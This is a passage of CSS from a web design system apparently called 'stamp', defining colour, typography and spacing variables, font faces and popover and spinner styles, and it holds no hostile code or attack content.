--stamp-text-link-l-pressed-font-family: Hanken Grotesk; --stamp-text-link-l-hover-letter-spacing: 0px; --stamp-text-link-l-hover-font-size: 16px; --stamp-text-link-l-hover-text-decoration: underline; --stamp-text-link-l-hover-line-height: 1.4; --stamp-text-link-l-hover-font-weight: 700; --stamp-text-link-l-hover-font-family: Hanken Grotesk; --stamp-text-link-l-default-letter-spacing: 0px; --stamp-text-link-l-default-font-size: 16px; --stamp-text-link-l-default-line-height: 1.4; --stamp-text-link-l-default-font-weight: 700; --stamp-text-link-l-default-font-family: Hanken Grotesk; --stamp-text-cta-pressed-letter-spacing: 0px; --stamp-text-cta-pressed-font-size: 16px; --stamp-text-cta-pressed-text-decoration: underline; --stamp-text-cta-pressed-line-height: 1.4; --stamp-text-cta-pressed-font-weight: 700; --stamp-text-cta-pressed-font-family: Hanken Grotesk; --stamp-text-cta-hover-letter-spacing: 0px; --stamp-text-cta-hover-font-size: 16px; --stamp-text-cta-hover-text-decoration: underline; --stamp-text-cta-hover-line-height: 1.4; --stamp-text-cta-hover-font-weight: 700; --stamp-text-cta-hover-font-family: Hanken Grotesk; --stamp-text-cta-default-letter-spacing: 0px; --stamp-text-cta-default-font-size: 16px; --stamp-text-cta-default-line-height: 1.4; --stamp-text-cta-default-font-weight: 700; --stamp-text-cta-default-font-family: Hanken Grotesk; --stamp-text-price-xs-default-letter-spacing: 0px; --stamp-text-price-xs-default-font-size: 16px; --stamp-text-price-xs-default-line-height: 1.05; --stamp-text-price-xs-default-font-weight: 800; --stamp-text-price-xs-default-font-family: Hanken Grotesk; --stamp-text-price-s-decimal-letter-spacing: 0px; --stamp-text-price-s-decimal-font-size: 19px; --stamp-text-price-s-decimal-line-height: 1.05; --stamp-text-price-s-decimal-font-weight: 800; --stamp-text-price-s-decimal-font-family: Hanken Grotesk; --stamp-text-price-s-default-letter-spacing: 0px; --stamp-text-price-s-default-font-size: 19px; --stamp-text-price-s-default-line-height: 1.05; --stamp-text-price-s-default-font-weight: 800; --stamp-text-price-s-default-font-family: Hanken Grotesk; --stamp-text-price-m-decimal-letter-spacing: 0px; --stamp-text-price-m-decimal-font-size: 25px; --stamp-text-price-m-decimal-line-height: 1.05; --stamp-text-price-m-decimal-font-weight: 800; --stamp-text-price-m-decimal-font-family: Hanken Grotesk; --stamp-text-price-m-default-letter-spacing: 0px; --stamp-text-price-m-default-font-size: 25px; --stamp-text-price-m-default-line-height: 1.05; --stamp-text-price-m-default-font-weight: 800; --stamp-text-price-m-default-font-family: Hanken Grotesk; --stamp-text-price-l-decimal-letter-spacing: 0px; --stamp-text-price-l-decimal-font-size: 33px; --stamp-text-price-l-decimal-line-height: 1.05; --stamp-text-price-l-decimal-font-weight: 800; --stamp-text-price-l-decimal-font-family: Hanken Grotesk; --stamp-text-price-l-default-letter-spacing: 0px; --stamp-text-price-l-default-font-size: 33px; --stamp-text-price-l-default-line-height: 1.05; --stamp-text-price-l-default-font-weight: 800; --stamp-text-price-l-default-font-family: Hanken Grotesk; --stamp-text-body-s-emphasis-letter-spacing: 0px; --stamp-text-body-s-emphasis-font-size: 14px; --stamp-text-body-s-emphasis-line-height: 1.6; --stamp-text-body-s-emphasis-font-weight: 700; --stamp-text-body-s-emphasis-font-family: Hanken Grotesk; --stamp-text-body-s-default-letter-spacing: 0px; --stamp-text-body-s-default-font-size: 14px; --stamp-text-body-s-default-line-height: 1.6; --stamp-text-body-s-default-font-weight: 400; --stamp-text-body-s-default-font-family: Hanken Grotesk; --stamp-text-body-m-emphasis-letter-spacing: 0px; --stamp-text-body-m-emphasis-font-size: 16px; --stamp-text-body-m-emphasis-line-height: 1.6; --stamp-text-body-m-emphasis-font-weight: 700; --stamp-text-body-m-emphasis-font-family: Hanken Grotesk; --stamp-text-body-m-default-letter-spacing: 0px; --stamp-text-body-m-default-font-size: 16px; --stamp-text-body-m-default-line-height: 1.6; --stamp-text-body-m-default-font-weight: 400; --stamp-text-body-m-default-font-family: Hanken Grotesk; --stamp-text-body-l-emphasis-letter-spacing: 0px; --stamp-text-body-l-emphasis-font-size: 19px; --stamp-text-body-l-emphasis-line-height: 1.6; --stamp-text-body-l-emphasis-font-weight: 700; --stamp-text-body-l-emphasis-font-family: Hanken Grotesk; --stamp-text-body-l-default-letter-spacing: 0px; --stamp-text-body-l-default-font-size: 19px; --stamp-text-body-l-default-line-height: 1.6; --stamp-text-body-l-default-font-weight: 400; --stamp-text-body-l-default-font-family: Hanken Grotesk; --stamp-text-subtitle-s-letter-spacing: 0px; --stamp-text-subtitle-s-font-size: 18px; --stamp-text-subtitle-s-line-height: 1.2; --stamp-text-subtitle-s-font-weight: 500; --stamp-text-subtitle-s-font-family: Hanken Grotesk; --stamp-text-subtitle-m-letter-spacing: 0px; --stamp-text-subtitle-m-font-size: 19px; --stamp-text-subtitle-m-line-height: 1.2; --stamp-text-subtitle-m-font-weight: 500; --stamp-text-subtitle-m-font-family: Hanken Grotesk; --stamp-text-subtitle-l-letter-spacing: 0px; --stamp-text-subtitle-l-font-size: 24px; --stamp-text-subtitle-l-line-height: 1.2; --stamp-text-subtitle-l-font-weight: 500; --stamp-text-subtitle-l-font-family: Hanken Grotesk; --stamp-text-heading-xxs-letter-spacing: 0px; --stamp-text-heading-xxs-font-size: 14px; --stamp-text-heading-xxs-line-height: 1.05; --stamp-text-heading-xxs-font-weight: 500; --stamp-text-heading-xxs-font-family: Hanken Grotesk; --stamp-text-heading-xs-letter-spacing: 0px; --stamp-text-heading-xs-font-size: 16px; --stamp-text-heading-xs-line-height: 1.2; --stamp-text-heading-xs-font-weight: 700; --stamp-text-heading-xs-font-family: Hanken Grotesk; --stamp-text-heading-s-letter-spacing: 0px; --stamp-text-heading-s-font-size: 18px; --stamp-text-heading-s-line-height: 1.05; --stamp-text-heading-s-font-weight: 700; --stamp-text-heading-s-font-family: ABC ROM; --stamp-text-heading-m-letter-spacing: 0px; --stamp-text-heading-m-font-size: 21px; --stamp-text-heading-m-line-height: 1.05; --stamp-text-heading-m-font-weight: 700; --stamp-text-heading-m-font-family: ABC ROM; --stamp-text-heading-l-letter-spacing: -0.5px; --stamp-text-heading-l-font-size: 25px; --stamp-text-heading-l-line-height: 0.95; --stamp-text-heading-l-font-weight: 700; --stamp-text-heading-l-font-family: ABC ROM; --stamp-text-heading-xl-letter-spacing: -1px; --stamp-text-heading-xl-font-size: 32px; --stamp-text-heading-xl-line-height: 0.9; --stamp-text-heading-xl-font-weight: 700; --stamp-text-heading-xl-font-family: ABC ROM; --stamp-text-heading-xxl-letter-spacing: -1.5px; --stamp-text-heading-xxl-font-size: 40px; --stamp-text-heading-xxl-line-height: 0.9; --stamp-text-heading-xxl-font-weight: 700; --stamp-text-heading-xxl-font-family: ABC ROM; --stamp-text-heading-3-xl-letter-spacing: -1.5px; --stamp-text-heading-3-xl-font-size: 54px; --stamp-text-heading-3-xl-line-height: 0.9; --stamp-text-heading-3-xl-font-weight: 700; --stamp-text-heading-3-xl-font-family: ABC ROM; --stamp-drop-shadow-block-start: 0px -2px 8px #1f1e2f26; --stamp-drop-shadow-flyout-down: 0px 2px 8px #1f1e2f26; --stamp-color-overflow-block-end: linear-gradient(180deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-block-start: linear-gradient(180deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-overflow-inline-end: linear-gradient(90deg, #ffffff00 0%, #ffffff 100%); --stamp-color-overflow-inline-start: linear-gradient(90deg, #ffffff 0%, #ffffff00 100%); --stamp-color-icon-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-icon-button-secondary-pressed: #001a73; --stamp-color-icon-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-icon-button-primary-pressed: #ffffff; --stamp-color-icon-icon-button-primary-default: #ffffff; --stamp-color-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-button-secondary-pressed: #001a73; --stamp-color-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-button-primary-pressed: #ffffff; --stamp-color-icon-button-primary-default: #ffffff; --stamp-color-icon-accent-inverse: #1f1e2f; --stamp-color-icon-accent-default: #ffffff; --stamp-color-icon-disabled: #bec0cb; --stamp-color-icon-selected: #e75204; --stamp-color-icon-pressed: #001a73; --stamp-color-icon-hover: #4e4ee2; --stamp-color-icon-negative: #ee3261; --stamp-color-icon-warning: #fdd732; --stamp-color-icon-positive: #00BB53; --stamp-color-icon-informative: #009ee3; --stamp-color-icon-sustainable: #00BB53; --stamp-color-icon-on-brand: #ffffff; --stamp-color-icon-subtle: #86889d; --stamp-color-icon-switch-active-disabled: #bec0cb; --stamp-color-icon-switch-active-hover: #4e4ee2; --stamp-color-icon-switch-active-strong: #e75204; --stamp-color-icon-switch-normal-disabled: #bec0cb; --stamp-color-icon-switch-normal-hover: #4e4ee2; --stamp-color-icon-switch-normal-strong: #1f1e2f; --stamp-color-icon-strong: #1f1e2f; --stamp-color-icon-brand: #e75204; --stamp-color-icon-default: #4e4ee2; --stamp-color-border-button-tertiary-pressed: #ffffff00; --stamp-color-border-button-tertiary-default: #ffffff00; --stamp-color-border-button-secondary-pressed: #001a73; --stamp-color-border-button-secondary-default: #6161ff; --stamp-color-border-button-primary-pressed: #ffffff00; --stamp-color-border-button-primary-default: #ffffff00; --stamp-color-border-fallback: #ffffff00; --stamp-color-border-focus-outline: #001a73; --stamp-color-border-disabled: #bec0cb; --stamp-color-border-error: #d70036; --stamp-color-border-selected: #e75204; --stamp-color-border-pressed: #001a73; --stamp-color-border-hover: #6161ff; --stamp-color-border-negative: #ee3261; --stamp-color-border-warning: #fdd732; --stamp-color-border-positive: #00BB53; --stamp-color-border-informative: #009ee3; --stamp-color-border-strong: #67687f; --stamp-color-border-brand: #e75204; --stamp-color-border-default: #bec0cb; --stamp-color-background-badge-brand: #D83D00; --stamp-color-background-badge-important: #d70036; --stamp-color-background-badge-secondary: #e7e8eb; --stamp-color-background-badge-primary: #6161ff; --stamp-color-background-app-brand: #D83D00; --stamp-color-background-app-default: #f1f1f2; --stamp-color-background-segment-selected: #6161ff; --stamp-color-background-segment-default: #ffffff00; --stamp-color-background-icon-button-tertiary-pressed: #ffffff00; --stamp-color-background-icon-button-tertiary-default: #ffffff00; --stamp-color-background-icon-button-secondary-pressed: #e7e8eb; --stamp-color-background-icon-button-secondary-default: #f1f1f2; --stamp-color-background-icon-button-primary-pressed: #001a73; --stamp-color-background-icon-button-primary-default: #6161ff; --stamp-color-background-date-input-today-disabled: #bec0cb; --stamp-color-background-date-input-today-default: #67687f; --stamp-color-background-date-input-date-disabled: #f1f1f2; --stamp-color-background-date-input-date-range: #ffede0; --stamp-color-background-date-input-date-default: #ffffff; --stamp-color-background-data-list-selected: #ffffff00; --stamp-color-background-data-list-pressed: #f1f1f2; --stamp-color-background-data-list-hover: #f1f1f2; --stamp-color-background-data-list-default: #ffffff00; --stamp-color-background-card-brand-red-accent: #ba2a0f; --stamp-color-background-card-brand-red-default: #d23416; --stamp-color-background-card-brand-green-accent: #004728; --stamp-color-background-card-brand-green-default: #005e35; --stamp-color-background-card-brand-blue-accent: #4e4ee2; --stamp-color-background-card-brand-blue-default: #6161ff; --stamp-color-background-card-brand-dark-blue-accent: #001252; --stamp-color-background-card-brand-dark-blue-default: #001a73; --stamp-color-background-card-brand-orange-accent: #C23400; --stamp-color-background-card-brand-orange-default: #D83D00; --stamp-color-background-card-inverse-accent: #ffffff; --stamp-color-background-card-inverse-default: #ffffff; --stamp-color-background-card-neutral-accent: #e7e8eb; --stamp-color-background-card-neutral-default: #f1f1f2; --stamp-color-background-button-tertiary-pressed: #ffffff00; --stamp-color-background-button-tertiary-default: #ffffff00; --stamp-color-background-button-secondary-pressed: #ffffff00; --stamp-color-background-button-secondary-default: #ffffff00; --stamp-color-background-button-primary-pressed: #001a73; --stamp-color-background-button-primary-default: #6161ff; --stamp-color-background-switch-button-active-disabled: #f1f1f2; --stamp-color-background-switch-button-active-default: #ffffff; --stamp-color-background-switch-button-normal-disabled: #f1f1f2; --stamp-color-background-switch-button-normal-default: #ffffff; --stamp-color-background-switch-normal-disabled: #bec0cb; --stamp-color-background-switch-normal-default: #86889d; --stamp-color-background-switch-active-disabled: #bec0cb; --stamp-color-background-switch-active-default: #e75204; --stamp-color-background-disabled: #f1f1f2; --stamp-color-background-negative: #ee32611a; --stamp-color-background-warning: #fdd7321a; --stamp-color-background-positive: #00bb531a; --stamp-color-background-informative: #009ee31a; --stamp-color-background-notification: #d70036; --stamp-color-background-inverse: #1f1e2f; --stamp-color-background-subtle: #dddee3; --stamp-color-background-strong: #86889d; --stamp-color-background-brand-deep: #D83D00; --stamp-color-background-brand-subtle: #e75204; --stamp-color-background-brand: #f56900; --stamp-color-background-variant: #f1f1f2; --stamp-color-background-default: #e7e8eb; --stamp-color-background-surface: #ffffff; --stamp-color-text-segment-selected: #ffffff; --stamp-color-text-segment-default: #4e4ee2; --stamp-color-text-link-visited: #d05aff; --stamp-color-text-link-pressed: #001a73; --stamp-color-text-link-hover: #4e4ee2; --stamp-color-text-link-on-brand: #ffffff; --stamp-color-text-link-subtle: #1f1e2f; --stamp-color-text-link-default: #4e4ee2; --stamp-color-text-icon-button-pressed: #001a73; --stamp-color-text-icon-button-default: #4e4ee2; --stamp-color-text-form-control-placeholder-disabled: #bec0cb; --stamp-color-text-form-control-placeholder-default: #67687f; --stamp-color-text-form-control-value-disabled: #86889d; --stamp-color-text-form-control-value-default: #1f1e2f; --stamp-color-text-date-input-today-disabled: #ffffff; --stamp-color-text-date-input-today-selected: #ffffff; --stamp-color-text-date-input-today-default: #ffffff; --stamp-color-text-date-input-date-disabled: #bec0cb; --stamp-color-text-date-input-date-selected: #1f1e2f; --stamp-color-text-date-input-date-pressed: #001a73; --stamp-color-text-date-input-date-hover: #4e4ee2; --stamp-color-text-date-input-date-subtle: #bec0cb; --stamp-color-text-date-input-date-strong: #1f1e2f; --stamp-color-text-date-input-date-default: #4e4ee2; --stamp-color-text-button-tertiary-pressed: #001a73; --stamp-color-text-button-tertiary-default: #4e4ee2; --stamp-color-text-button-secondary-pressed: #001a73; --stamp-color-text-button-secondary-default: #4e4ee2; --stamp-color-text-button-primary-pressed: #ffffff; --stamp-color-text-button-primary-default: #ffffff; --stamp-color-text-negative: #d70036; --stamp-color-text-positive: #008005; --stamp-color-text-inverse: #ffffff; --stamp-color-text-on-brand: #ffffff; --stamp-color-text-subtle: #67687f; --stamp-color-text-brand: #D83D00; --stamp-color-text-default: #1f1e2f; --stamp-color-heading-on-brand: #ffffff; --stamp-color-heading-subtle: #1f1e2f; --stamp-color-heading-brand: #e75204; --stamp-color-heading-default: #001a73; }

html { box-sizing: border-box; }

*, ::before, ::after { padding: 0px; margin: 0px; box-sizing: border-box; }

a { text-decoration: underline; color: var(--stamp-color-text-default); }

address { font-style: normal; }

:root { --z-index-base: 0; --z-index-above: 1; --z-index-below: -1; }

.sr-only { position: absolute; inline-size: 1px; block-size: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px; }

.lock-scroll { top: var(--locked-scroll-position, 0); position: fixed; width: 100%; overflow: hidden; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: italic; font-weight: 700; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: normal; font-weight: 700; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: italic; font-weight: 400; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: normal; font-weight: 400; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: italic; font-weight: 300; }

@font-face { font-family: PostNL; src: url(&quot;&quot;) format(&quot;woff2&quot;); font-style: normal; font-weight: 300; }

@font-face { font-family: Hanken Grotesk; src: url(&quot;&quot;) format(&quot;woff2 supports variations&quot;), url(&quot;&quot;) format(&quot;woff2-variations&quot;); font-weight: 100 900; }

@font-face { font-family: Hanken Grotesk; src: url(&quot;&quot;) format(&quot;woff2 supports variations&quot;), url(&quot;&quot;) format(&quot;woff2-variations&quot;); font-style: italic; font-weight: 100 900; }

@font-face { font-family: ABC ROM; src: url(&quot;&quot;) format(&quot;woff2&quot;); }

.stamp-popover { --tooth-size: 8px; position: fixed; display: flex; flex-direction: column; filter: drop-shadow(var(--stamp-drop-shadow-flyout-down)); inline-size: auto; outline: none; }

.stamp-popover--up { flex-direction: column; }

.stamp-popover--down { flex-direction: column-reverse; }

.stamp-popover__content { background-color: var(--stamp-color-background-surface); border-radius: 4px; padding: var(--stamp-spacing-inner-l); max-inline-size: 536px; margin-inline: var(--stamp-spacing-outer-s); }

.stamp-popover__title { font-family: var(--stamp-text-heading-xs-font-family); font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-popover__message { font-weight: var(--stamp-text-body-m-default-font-weight); }

.stamp-popover__dismiss-button { position: absolute; inset-inline-end: var(--stamp-spacing-inner-m); inset-block-start: var(--stamp-spacing-inner-m); border: medium; cursor: pointer; }

.stamp-popover--down .stamp-popover__dismiss-button { inset-block-start: calc(var(--stamp-spacing-inner-m) + var(--tooth-size) * 2); }

.stamp-popover__tooth { inline-size: 0px; block-size: 0px; border-style: solid; border-width: var(--tooth-size); }

.stamp-popover--down .stamp-popover__tooth { border-top-color: transparent; border-right-color: transparent; border-bottom-color: var(--stamp-color-background-surface); border-left-color: transparent; }

.stamp-popover--up .stamp-popover__tooth { border-top-color: var(--stamp-color-background-surface); border-right-color: transparent; border-bottom-color: transparent; border-left-color: transparent; }

.stamp-spinner { display: block; inline-size: 32px; block-size: 32px; }

.stamp-spinner--size-s { inline-size: 24px; block-size: 24px; }

.stamp-spinner--size-m { inline-size: 32px; block-size: 32px; }

.stamp-spinner--size-l { inline-size: 48px; block-size: 48px; }

.stamp-spinner__spinner { display: block; animation: 1500ms linear infinite spin; inline-size: 100%; block-size: 100%; }

.stamp-spinner__spinner svg { inline-size: 100%; block-size: 100%; }

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.stamp-theme-light { --stamp-opacity-illustration-disabled: 60%; --stamp-opacity-illustration-default: 100%; --stamp-opacity-mix-subtle: 10%; --stamp-opacity-mix-strong: 90%; --stamp-opacity-mix-default: 30%; --stamp-opacity-backdrop: 60%; --stamp-blend-mode-disabled: Luminosity; --stamp-blend-mode-default: Normal; --stamp-border-width-l: 4px; --stamp-border-width-m: 2px; --stamp-border-width-s: 1px; --stamp-border-width-xs: 0.5px; --stamp-radius-xxl: 32px; --stamp-radius-xl: 24px; --stamp-radius-l: 16px; --stamp-radius-m: 8px; --stamp-radius-s: 6px; --stamp-radius-xs: 4px; --stamp-radius-xxs: 2px; --stamp-size-medium-illustration-m: 240px; --stamp-size-medium-illustration-s: 204px; --stamp-size-illustration-3-xl: 144px; --stamp-size-illustration-xxl: 120px; --stamp-size-illustration-xl: 96px; --stamp-size-illustration-l: 88px; --stamp-size-illustration-m: 80px; --stamp-size-illustration-s: 56px; --stamp-size-icon-l: 40px; --stamp-size-icon-m: 24px; --stamp-size-icon-s: 16px; --stamp-spacing-outer-xl: 88px; --stamp-spacing-outer-l: 56px; --stamp-spacing-outer-m: 40px; --stamp-spacing-outer-s: 24px; --stamp-spacing-outer-xs: 16px; --stamp-spacing-inner-4-xl: 56px; --stamp-spacing-inner-3-xl: 40px; --stamp-spacing-inner-xxl: 32px; --stamp-spacing-inner-xl: 24px; --stamp-spacing-inner-l: 16px; --stamp-spacing-inner-m: 12px; --stamp-spacing-inner-s: 8px; --stamp-spacing-inner-xs: 4px; --stamp-spacing-inner-xxs: 2px; --stamp-text-app-navigation-selected-letter-spacing: 0px; --stamp-text-app-navigation-selected-font-size: 12px; --stamp-text-app-navigation-selected-line-height: 1.6; --stamp-text-app-navigation-selected-font-weight: 700; --stamp-text-app-navigation-selected-font-family: Hanken Grotesk; --stamp-text-app-navigation-default-letter-spacing: 0px; --stamp-text-app-navigation-default-font-size: 12px; --stamp-text-app-navigation-default-line-height: 1.6; --stamp-text-app-navigation-default-font-weight: 400; --stamp-text-app-navigation-default-font-family: Hanken Grotesk; --stamp-text-step-todo-letter-spacing: 0px; --stamp-text-step-todo-font-size: 16px; --stamp-text-step-todo-line-height: 1.6; --stamp-text-step-todo-font-weight: 400; --stamp-text-step-todo-font-family: Hanken Grotesk; --stamp-text-step-default-letter-spacing: 0px; --stamp-text-step-default-font-size: 16px; --stamp-text-step-default-line-height: 1.6; --stamp-text-step-default-font-weight: 400; --stamp-text-step-default-font-family: Hanken Grotesk; --stamp-text-badge-default-letter-spacing: 0px; --stamp-text-badge-default-font-size: 14px; --stamp-text-badge-default-line-height: 1.05; --stamp-text-badge-default-font-weight: 400; --stamp-text-badge-default-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-selected-letter-spacing: 0px; --stamp-text-form-date-input-date-selected-font-size: 18px; --stamp-text-form-date-input-date-selected-line-height: 1.4; --stamp-text-form-date-input-date-selected-font-weight: 700; --stamp-text-form-date-input-date-selected-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-pressed-text-decoration: underline; --stamp-text-form-date-input-date-pressed-letter-spacing: 0px; --stamp-text-form-date-input-date-pressed-font-size: 18px; --stamp-text-form-date-input-date-pressed-line-height: 1.4; --stamp-text-form-date-input-date-pressed-font-weight: 400; --stamp-text-form-date-input-date-pressed-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-hover-text-decoration: underline; --stamp-text-form-date-input-date-hover-letter-spacing: 0px; --stamp-text-form-date-input-date-hover-font-size: 18px; --stamp-text-form-date-input-date-hover-line-height: 1.4; --stamp-text-form-date-input-date-hover-font-weight: 400; --stamp-text-form-date-input-date-hover-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-default-letter-spacing: 0px; --stamp-text-form-date-input-date-default-font-size: 18px; --stamp-text-form-date-input-date-default-line-height: 1.4; --stamp-text-form-date-input-date-default-font-weight: 400; --stamp-text-form-date-input-date-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-body-highlighted-text-decoration: underline; --stamp-text-form-data-list-body-highlighted-font-size: 14px; --stamp-text-form-data-list-body-highlighted-line-height: 1.6; --stamp-text-form-data-list-body-highlighted-font-weight: 400; --stamp-text-form-data-list-body-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-pressed-letter-spacing: 0px; --stamp-text-form-data-list-body-pressed-font-size: 14px; --stamp-text-form-data-list-body-pressed-line-height: 1.6; --stamp-text-form-data-list-body-pressed-font-weight: 400; --stamp-text-form-data-list-body-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-hover-letter-spacing: 0px; --stamp-text-form-data-list-body-hover-font-size: 14px; --stamp-text-form-data-list-body-hover-line-height: 1.6; --stamp-text-form-data-list-body-hover-font-weight: 400; --stamp-text-form-data-list-body-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-default-letter-spacing: 0px; --stamp-text-form-data-list-body-default-font-size: 14px; --stamp-text-form-data-list-body-default-line-height: 1.6; --stamp-text-form-data-list-body-default-font-weight: 400; --stamp-text-form-data-list-body-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-title-highlighted-text-decoration: underline; --stamp-text-form-data-list-title-highlighted-font-size: 16px; --stamp-text-form-data-list-title-highlighted-line-height: 1.4; --stamp-text-form-data-list-title-highlighted-font-weight: 700; --stamp-text-form-data-list-title-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-pressed-letter-spacing: 0px; --stamp-text-form-data-list-title-pressed-font-size: 16px; --stamp-text-form-data-list-title-pressed-line-height: 1.4; --stamp-text-form-data-list-title-pressed-font-weight: 700; --stamp-text-form-data-list-title-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-hover-letter-spacing: 0px; --stamp-text-form-data-list-title-hover-font-size: 16px; --stamp-text-form-data-list-title-hover-line-height: 1.4; --stamp-text-form-data-list-title-hover-font-weight: 700; --stamp-text-form-data-list-title-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-default-letter-spacing: 0px; --stamp-text-form-data-list-title-default-font-size: 16px; --stamp-text-form-data-list-title-default-line-height: 1.4; --stamp-text-form-data-list-title-default-font-weight: 700; --stamp-text-form-data-list-title-default-font-family: Hanken Grotesk; --stamp-text-form-feedback-letter-spacing: 0px; --stamp-text-form-feedback-font-size: 14px; --stamp-text-form-feedback-line-height: 1.4; --stamp-text-form-feedback-font-weight: 700; --stamp-text-form-feedback-font-family: Hanken Grotesk; --stamp-text-form-label-letter-spacing: 0px; --stamp-text-form-label-font-size: 16px; --stamp-text-form-label-line-height: 1.2; --stamp-text-form-label-font-weight: 700; --stamp-text-form-label-font-family: Hanken Grotesk; --stamp-text-hyperlink-pressed-letter-spacing: 0px; --stamp-text-hyperlink-pressed-text-decoration: underline; --stamp-text-hyperlink-pressed-font-size: 16px; --stamp-text-hyperlink-pressed-line-height: 1.6; --stamp-text-hyperlink-pressed-font-weight: 400; --stamp-text-hyperlink-pressed-font-family: Hanken Grotesk; --stamp-text-hyperlink-hover-letter-spacing: 0px; --stamp-text-hyperlink-hover-text-decoration: underline; --stamp-text-hyperlink-hover-font-size: 16px; --stamp-text-hyperlink-hover-line-height: 1.6; --stamp-text-hyperlink-hover-font-weight: 400; --stamp-text-hyperlink-hover-font-family: Hanken Grotesk; --stamp-text-hyperlink-default-letter-spacing: 0px; --stamp-text-hyperlink-default-text-decoration: underline; --stamp-text-hyperlink-default-font-size: 16px; --stamp-text-hyperlink-default-line-height: 1.6; --stamp-text-hyperlink-default-font-weight: 400; --stamp-text-hyperlink-default-font-family: Hanken Grotesk; --stamp-text-link-s-pressed-text-decoration: underline; --stamp-text-link-s-pressed-letter-spacing: 0px; --stamp-text-link-s-pressed-font-size: 14px; --stamp-text-link-s-pressed-line-height: 1.6; --stamp-text-link-s-pressed-font-weight: 400; --stamp-text-link-s-pressed-font-family: Hanken Grotesk; --stamp-text-link-s-hover-text-decoration: underline; --stamp-text-link-s-hover-letter-spacing: 0px; --stamp-text-link-s-hover-font-size: 14px; --stamp-text-link-s-hover-line-height: 1.6; --stamp-text-link-s-hover-font-weight: 400; --stamp-text-link-s-hover-font-family: Hanken Grotesk; --stamp-text-link-s-default-letter-spacing: 0px; --stamp-text-link-s-default-font-size: 14px; --stamp-text-link-s-default-line-height: 1.6; --stamp-text-link-s-default-font-weight: 400; --stamp-text-link-s-default-font-family: Hanken Grotesk; --stamp-text-link-m-pressed-text-decoration: underline; --stamp-text-link-m-pressed-letter-spacing: 0px; --stamp-text-link-m-pressed-font-size: 16px; --stamp-text-link-m-pressed-line-height: 1.6; --stamp-text-link-m-pressed-font-weight: 400; --stamp-text-link-m-pressed-font-family: Hanken Grotesk; --stamp-text-link-m-hover-text-decoration: underline; --stamp-text-link-m-hover-letter-spacing: 0px; --stamp-text-link-m-hover-font-size: 16px; --stamp-text-link-m-hover-line-height: 1.6; --stamp-text-link-m-hover-font-weight: 400; --stamp-text-link-m-hover-font-family: Hanken Grotesk; --stamp-text-link-m-default-letter-spacing: 0px; --stamp-text-link-m-default-font-size: 16px; --stamp-text-link-m-default-line-height: 1.6; --stamp-text-link-m-default-font-weight: 400; --stamp-text-link-m-default-font-family: Hanken Grotesk; --stamp-text-link-l-pressed-letter-spacing: 0px; --stamp-text-link-l-pressed-font-size: 16px; --stamp-text-link-l-pressed-text-decoration: underline; --stamp-text-link-l-pressed-line-height: 1.4; --stamp-text-link-l-pressed-font-weight: 700; --stamp-text-link-l-pressed-font-family: Hanken Grotesk; --stamp-text-link-l-hover-letter-spacing: 0px; --stamp-text-link-l-hover-font-size: 16px; --stamp-text-link-l-hover-text-decoration: underline; --stamp-text-link-l-hover-line-height: 1.4; --stamp-text-link-l-hover-font-weight: 700; --stamp-text-link-l-hover-font-family: Hanken Grotesk; --stamp-text-link-l-default-letter-spacing: 0px; --stamp-text-link-l-default-font-size: 16px; --stamp-text-link-l-default-line-height: 1.4; --stamp-text-link-l-default-font-weight: 700; --stamp-text-link-l-default-font-family: Hanken Grotesk; --stamp-text-cta-pressed-letter-spacing: 0px; --stamp-text-cta-pressed-font-size: 16px; --stamp-text-cta-pressed-text-decoration: underline; --stamp-text-cta-pressed-line-height: 1.4; --stamp-text-cta-pressed-font-weight: 700; --stamp-text-cta-pressed-font-family: Hanken Grotesk; --stamp-text-cta-hover-letter-spacing: 0px; --stamp-text-cta-hover-font-size: 16px; --stamp-text-cta-hover-text-decoration: underline; --stamp-text-cta-hover-line-height: 1.4; --stamp-text-cta-hover-font-weight: 700; --stamp-text-cta-hover-font-family: Hanken Grotesk; --stamp-text-cta-default-letter-spacing: 0px; --stamp-text-cta-default-font-size: 16px; --stamp-text-cta-default-line-height: 1.4; --stamp-text-cta-default-font-weight: 700; --stamp-text-cta-default-font-family: Hanken Grotesk; --stamp-text-price-xs-default-letter-spacing: 0px; --stamp-text-price-xs-default-font-size: 16px; --stamp-text-price-xs-default-line-height: 1.05; --stamp-text-price-xs-default-font-weight: 800; --stamp-text-price-xs-default-font-family: Hanken Grotesk; --stamp-text-price-s-decimal-letter-spacing: 0px; --stamp-text-price-s-decimal-font-size: 19px; --stamp-text-price-s-decimal-line-height: 1.05; --stamp-text-price-s-decimal-font-weight: 800; --stamp-text-price-s-decimal-font-family: Hanken 